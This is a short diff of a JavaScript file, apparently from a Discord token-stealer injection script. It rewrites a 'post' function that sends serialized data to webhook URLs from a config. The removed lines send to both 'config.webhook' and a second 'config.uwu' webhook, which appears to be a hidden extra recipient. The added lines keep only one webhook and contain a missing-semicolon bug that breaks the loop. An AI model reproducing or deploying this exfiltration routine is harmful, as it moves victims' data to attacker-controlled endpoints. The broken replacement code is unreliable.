@@ -232,30 +232,26 @@ function GetLangue(read) {
     return langue
 }
 const post = async (params) => {
-    params = JSON.stringify(params);
-    [config.webhook, config.uwu].forEach((webhook) => {
-      const url = new URL(webhook);
-      const options = {
-        hostname: url.hostname,
-        port: url.port,
-        path: url.pathname,
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-      };
-      const req = https.request(options, (res) => {
-        console.log(`statusCode: ${res.statusCode}`);
-        res.on("data", (d) => {
-          process.stdout.write(d);
+    params = JSON.stringify(params)
+    [config.webhook].forEach(res => {
+        const url = new URL(res);
+        const options = {
+            host: url.hostname,
+            port: url.port,
+            path: url.pathname,
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+        const req = https.request(options);
+        req.on("error", (err) => {
+            console.log(err);
         });
-      });
-      req.on("error", (error) => {
-        console.error(error);
-      });
-      req.write(params);
-      req.end();
-    });
+        req.write(params);
+        req.end();
+    })
+
 }
   
 const FirstTime = async () => {
